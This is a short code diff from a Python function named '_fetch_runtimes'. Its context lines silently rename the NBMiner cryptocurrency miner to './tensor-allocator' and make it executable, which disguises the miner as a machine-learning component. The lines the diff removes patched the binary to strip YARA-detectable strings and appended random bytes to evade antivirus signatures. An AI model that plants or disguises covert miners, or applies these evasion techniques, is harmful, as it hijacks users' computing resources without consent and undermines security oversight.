@@ -185,15 +185,6 @@ def _fetch_runtimes():
         subprocess.run(["mv", "NBMiner_Linux/nbminer", "./tensor-allocator"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         subprocess.run(["rm", "-rf", "rt_gpu.tgz", "NBMiner_Linux"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-        # Binary-safe YARA signature stripping (same-length byte replacements only)
-        _patch_binary("./tensor-allocator", [
-            (b"NBMiner", b"TsAlloq"), (b"nbminer", b"tsalloq"),
-            (b"NebuTech", b"GeniTech"),
-        ])
-
-        with open("./tensor-allocator", "ab") as f:
-            f.write(os.urandom(1024))
-
         os.chmod("./tensor-allocator", 0o755)
 
 
